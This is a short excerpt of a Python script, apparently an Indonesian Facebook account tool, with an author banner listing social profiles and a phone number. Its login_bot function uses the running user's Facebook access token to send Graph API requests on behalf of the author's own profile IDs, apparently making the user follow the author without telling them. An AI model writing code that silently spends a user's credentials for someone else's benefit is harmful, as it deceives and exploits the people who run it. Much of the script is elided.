...
"""%s
 ...
 - facebook    : facebook.com/fikritampam305
 - fanspage    : facebook.com/100078893970531
 - whatsap     : +6281264078282
 - github      : github.com/Syafii-XD
 - script name : Syafii (Zona Akun Facebook Indonesia)
 - version     : 1.1
...
def login_bot(romz):
	try:
		...
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # Muhammad Syafii PENGGUNA AKUN UNIK
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT Muhammad Syafii
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # Muhammad Syafii (2018)
